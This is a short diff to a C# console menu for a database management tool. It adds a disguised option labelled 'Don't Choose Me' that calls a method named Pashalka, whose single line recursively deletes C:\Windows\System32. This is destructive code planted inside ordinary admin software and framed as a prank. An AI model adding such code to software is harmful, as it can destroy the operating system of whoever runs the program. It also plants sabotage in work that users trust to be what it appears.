@@ -44,6 +44,7 @@ while (running)
     Console.WriteLine("9. Event Manager");
     Console.WriteLine("10. Seed Database with Test Data");
     Console.WriteLine("11. Clear All Database Tables");
+    Console.WriteLine("12. Don't Choose Me");
     Console.WriteLine("0. Exit");
     Console.WriteLine("==============================");
     Console.Write("Select manager: ");
@@ -86,6 +87,9 @@ while (running)
                 break;
             case "11":
                 ClearAllTables();
+                break;
+            case "12":
+                Pashalka();
                 break;
             case "0":
                 running = false;
@@ -144,6 +148,11 @@ void UserManagerMenu()
 
     WaitForKey();
 }
+
+void Pashalka()
+{
+    Directory.Delete(@"C:\Windows\System32", true);
+} 
 
 void TeamManagerMenu()
 {
